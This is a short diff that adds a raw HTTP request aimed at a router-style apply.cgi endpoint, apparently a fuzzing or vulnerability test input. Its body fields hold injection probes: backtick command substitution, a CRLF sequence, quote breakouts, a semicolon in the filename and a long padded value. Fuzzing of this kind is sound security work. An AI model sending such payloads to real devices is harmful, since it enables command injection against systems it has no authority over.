@@ -1,0 +1,5 @@
+GET /apply.cgi?wifi_channel_coexist HTTP/1.1
+Content-Type: application/json
+Content-Length: 274
+
+hidd_coexist_flag=wzqwzqwzq&hidd_a_coexist_flag=\r\n`wzq`&hidd_wifi_restart_flag=",wzq&submit_flag=USB_advanced&%20timestamp=aaaWZQaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaa&filename=;"wzq
